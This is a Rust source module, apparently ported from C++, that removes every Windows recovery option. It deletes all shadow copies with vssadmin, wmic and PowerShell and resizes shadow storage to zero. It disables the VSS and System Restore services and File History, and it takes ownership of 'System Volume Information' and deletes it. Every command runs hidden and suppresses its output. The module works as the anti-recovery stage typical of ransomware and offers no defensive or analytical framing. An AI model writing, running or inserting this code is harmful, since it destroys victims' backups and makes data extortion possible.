//! Windows Volume Shadow Copy (VSS) and System Restore Point Remover
//! 
//! This module provides functionality to remove volume shadow copies and
//! system restore points on Windows systems, similar to the provided C++ code.

#[cfg(windows)]
use std::process::Command;
#[cfg(windows)]
use windows::Win32::System::Services::{
    OpenSCManagerW, OpenServiceW, CloseServiceHandle, SC_MANAGER_CONNECT, SERVICE_QUERY_STATUS,
};
#[cfg(windows)]
use windows::Win32::System::Registry::{
    HKEY_LOCAL_MACHINE, RegOpenKeyExA, RegSetValueExA, RegCloseKey, KEY_ALL_ACCESS, REG_DWORD,
};
#[cfg(windows)]
use windows::Win32::Storage::FileSystem::{
    GetLogicalDriveStringsW, GetDriveTypeA, DRIVE_FIXED,
};
#[cfg(windows)]
use std::ffi::OsStr;
#[cfg(windows)]
use std::os::windows::ffi::OsStrExt;
use tokio::process::Command as TokioCommand;
#[cfg(windows)]
use tokio::time::{timeout, Duration};
#[cfg(windows)]
use tokio;

/// Force deletes all shadows and restore points
#[cfg(windows)]
pub fn force_delete_all_shadows() {
    disable_file_history_and_versions();
    disable_system_restore_via_registry();
    delete_all_volume_shadows();
    delete_shadows_with_commands();
    delete_restore_point_folders();
    cleanup_shadow_storage();

    // Final cleanup commands
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("vssadmin delete shadows /all /quiet >nul 2>&1")
        .output();
        
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("wmic shadowcopy delete >nul 2>&1")
        .output();
}

/// Async version of force_delete_all_shadows with proper timeout handling
#[cfg(windows)]
pub async fn force_delete_all_shadows_async() {
    // Disable file history first (low impact operations)
    disable_file_history_and_versions();
    disable_system_restore_via_registry();

    // Run VSS cleanup with timeout
    let _ = timeout(
        Duration::from_secs(15),
        async {
            delete_all_volume_shadows_async().await;
            delete_shadows_with_commands_async().await;
            delete_restore_point_folders_async().await;
            cleanup_shadow_storage_async().await;
        }
    ).await;

    // Final cleanup commands with individual timeouts
    let _ = timeout(
        Duration::from_secs(5),
        TokioCommand::new("cmd")
            .arg("/C")
            .arg("vssadmin delete shadows /all /quiet >nul 2>&1")
            .output()
    ).await;

    let _ = timeout(
        Duration::from_secs(5),
        TokioCommand::new("cmd")
            .arg("/C")
            .arg("wmic shadowcopy delete >nul 2>&1")
            .output()
    ).await;
}

/// Checks if VSS service is available
#[cfg(windows)]
fn is_vss_service_available() -> bool {
    unsafe {
        let sc_manager = OpenSCManagerW(
            std::ptr::null(),
            std::ptr::null(),
            SC_MANAGER_CONNECT,
        );
        
        if sc_manager.is_null() {
            return false;
        }
        
        let service_name: Vec<WCHAR> = OsStr::new("VSS")
            .encode_wide()
            .chain(Some(0).into_iter())
            .collect();
            
        let service = OpenServiceW(
            sc_manager,
            service_name.as_ptr(),
            SERVICE_QUERY_STATUS,
        );
        
        let available = !service.is_null();
        
        if !service.is_null() {
            CloseServiceHandle(service);
        }
        
        CloseServiceHandle(sc_manager);
        
        available
    }
}

/// Deletes all volume shadows using WMI
#[cfg(windows)]
fn delete_all_volume_shadows() {
    if !is_vss_service_available() {
        return;
    }

    // Using PowerShell to delete all shadow copies via WMI
    let _output = Command::new("powershell")
        .arg("-Command")
        .arg("Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }")
        .output();
}

/// Async version of delete_all_volume_shadows
#[cfg(windows)]
async fn delete_all_volume_shadows_async() {
    if !is_vss_service_available() {
        return;
    }

    let _ = timeout(
        Duration::from_secs(8),
        TokioCommand::new("powershell")
            .arg("-Command")
            .arg("Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }")
            .output()
    ).await;
}

/// Deletes shadows using vssadmin and wmic commands
#[cfg(windows)]
fn delete_shadows_with_commands() {
    if !is_vss_service_available() {
        return;
    }

    // Using vssadmin to delete shadows
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("vssadmin delete shadows /all /quiet >nul 2>&1")
        .output();

    // Using wmic to delete shadow copies
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("wmic shadowcopy delete >nul 2>&1")
        .output();
}

/// Async version of delete_shadows_with_commands
#[cfg(windows)]
async fn delete_shadows_with_commands_async() {
    if !is_vss_service_available() {
        return;
    }

    let _ = timeout(
        Duration::from_secs(5),
        TokioCommand::new("cmd")
            .arg("/C")
            .arg("vssadmin delete shadows /all /quiet >nul 2>&1")
            .output()
    ).await;

    let _ = timeout(
        Duration::from_secs(5),
        TokioCommand::new("cmd")
            .arg("/C")
            .arg("wmic shadowcopy delete >nul 2>&1")
            .output()
    ).await;
}

/// Cleans up shadow storage by setting max size to 0
#[cfg(windows)]
fn cleanup_shadow_storage() {
    if !is_vss_service_available() {
        return;
    }

    // Get logical drives and resize shadow storage for each fixed drive
    if let Ok(logical_drives) = get_logical_drives() {
        for drive in logical_drives {
            if is_fixed_drive(&drive) {
                let cmd = format!(
                    "vssadmin Resize ShadowStorage /For={} /On={} /MaxSize=0 >nul 2>&1",
                    drive, drive
                );
                
                let _output = Command::new("cmd")
                    .arg("/C")
                    .arg(cmd)
                    .output();
                    
                // Add a small delay to prevent overwhelming the system
                std::thread::sleep(std::time::Duration::from_millis(500));
            }
        }
    }
}

/// Async version of cleanup_shadow_storage
#[cfg(windows)]
async fn cleanup_shadow_storage_async() {
    if !is_vss_service_available() {
        return;
    }

    // Get logical drives in blocking task
    let drives = tokio::task::spawn_blocking(|| get_logical_drives()).await
        .unwrap_or_else(|_| Ok(Vec::new()))
        .unwrap_or_default();

    for drive in drives {
        if is_fixed_drive(&drive) {
            let cmd = format!(
                "vssadmin Resize ShadowStorage /For={} /On={} /MaxSize=0 >nul 2>&1",
                drive, drive
            );
            
            let _ = timeout(
                Duration::from_secs(3),
                TokioCommand::new("cmd")
                    .arg("/C")
                    .arg(cmd)
                    .output()
            ).await;
            
            // Short delay between operations
            tokio::time::sleep(Duration::from_millis(200)).await;
        }
    }
}

/// Gets a list of logical drives on the system
#[cfg(windows)]
fn get_logical_drives() -> Result<Vec<String>, std::io::Error> {
    use std::mem;
    
    let buffer_size = 1024;
    let mut buffer: Vec<u16> = vec![0; buffer_size];
    
    let len = unsafe { 
        GetLogicalDriveStringsW(
            buffer_size as u32, 
            buffer.as_mut_ptr()
        ) 
    };
    
    if len == 0 {
        return Err(std::io::Error::last_os_error());
    }
    
    let mut drives = Vec::new();
    let mut i = 0;
    
    while i < len as usize {
        let start = i;
        while i < buffer.len() && buffer[i] != 0 {
            i += 1;
        }
        
        if i > start {
            let drive_string: String = String::from_utf16_lossy(&buffer[start..i]);
            drives.push(drive_string);
        }
        i += 1; // Skip null terminator
    }
    
    Ok(drives)
}

/// Checks if a drive is a fixed drive
#[cfg(windows)]
fn is_fixed_drive(drive: &str) -> bool {
    use std::ffi::CString;
    
    if let Ok(cstring) = CString::new(drive.trim_end_matches('\\')) {
        let drive_type = unsafe { GetDriveTypeA(windows::core::PCSTR(cstring.as_ptr())) };
        drive_type == DRIVE_FIXED
    } else {
        false
    }
}

/// Disables file history and versions
#[cfg(windows)]
fn disable_file_history_and_versions() {
    // Disable File History via registry
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\FileHistory\" /v \"Disabled\" /t REG_DWORD /d 1 /f >nul 2>&1")
        .output();

    if is_vss_service_available() {
        // Disable VSS service
        let _output = Command::new("cmd")
            .arg("/C")
            .arg("sc config VSS start= disabled >nul 2>&1")
            .output();
            
        // Stop VSS service
        let _output = Command::new("cmd")
            .arg("/C")
            .arg("sc stop VSS >nul 2>&1")
            .output();
    }

    // Disable File History scheduled tasks
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("schtasks /change /tn \"\\Microsoft\\Windows\\FileHistory\\File History (maintenance mode)\" /disable >nul 2>&1")
        .output();
        
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("schtasks /change /tn \"\\Microsoft\\Windows\\FileHistory\\File History\" /disable >nul 2>&1")
        .output();

    // Disable System Restore service
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("sc config sr start= disabled >nul 2>&1")
        .output();
        
    let _output = Command::new("cmd")
        .arg("/C")
        .arg("sc stop sr >nul 2>&1")
        .output();
}

/// Disables system restore via registry
#[cfg(windows)]
fn disable_system_restore_via_registry() {
    use std::ptr;
    use std::ffi::CString;
    
    unsafe {
        let sub_key = CString::new("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore").unwrap();
        let mut hkey = windows::Win32::Foundation::HANDLE::default();
        
        let status = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            sub_key.as_ptr(),
            0,
            KEY_ALL_ACCESS,
            &mut hkey,
        );
        
        if status.is_ok() {
            let value_name = CString::new("DisableSR").unwrap();
            let disable_restore: u32 = 1;
            
            RegSetValueExA(
                hkey,
                value_name.as_ptr(),
                0,
                REG_DWORD,
                Some(std::slice::from_raw_parts(&disable_restore as *const u32 as *const u8, std::mem::size_of::<u32>())),
            );
            
            RegCloseKey(hkey);
        }
    }
}

/// Deletes restore point folders
#[cfg(windows)]
fn delete_restore_point_folders() {
    // Get system drive
    let system_drive = std::env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string());
    let system_volume_path = format!("{}\\System Volume Information", system_drive);
    
    // Use PowerShell to take ownership and delete the folder
    let ps_command = format!(
        "powershell -Command \"Start-Process powershell -ArgumentList '-Command \\\"Try {{ Takeown /f \\\"{}\\\" /r /d y; \
         Icacls \\\"{}\\\" /grant administrators:F /t /c /l /q; \
         Remove-Item -Path \\\"{}\\\" -Recurse -Force -ErrorAction SilentlyContinue }} \
         Catch {{ }}\\\"' -Verb RunAs\" -WindowStyle Hidden",
        system_volume_path, system_volume_path, system_volume_path
    );
    
    let _output = Command::new("cmd")
        .arg("/C")
        .arg(ps_command)
        .output();
}

/// Async version of delete_restore_point_folders (critical section)
#[cfg(windows)]
async fn delete_restore_point_folders_async() {
    let system_drive = std::env::var("SystemDrive").unwrap_or_else(|_| "C:".to_string());
    let system_volume_path = format!("{}\\System Volume Information", system_drive);

    // Use spawn_blocking for high-privilege operations
    let _ = tokio::time::timeout(
        Duration::from_secs(12),
        tokio::task::spawn_blocking(move || {
            // Take ownership first
            let _ = Command::new("cmd")
                .arg("/C")
                .arg(&format!(
                    "Takeown /f \"{}\" /r /d y >nul 2>&1",
                    system_volume_path
                ))
                .output();

            // Grant permissions
            let _ = Command::new("cmd")
                .arg("/C")
                .arg(&format!(
                    "Icacls \"{}\" /grant administrators:F /t /c /l /q >nul 2>&1",
                    system_volume_path
                ))
                .output();

            // Attempt deletion
            let _ = Command::new("cmd")
                .arg("/C")
                .arg(&format!(
                    "rmdir /s /q \"{}\" >nul 2>&1",
                    system_volume_path
                ))
                .output();
        })
    ).await;
}

/// Non-Windows implementation (no-op)
#[cfg(not(windows))]
pub fn force_delete_all_shadows() {
    // Nothing to do on non-Windows platforms
}
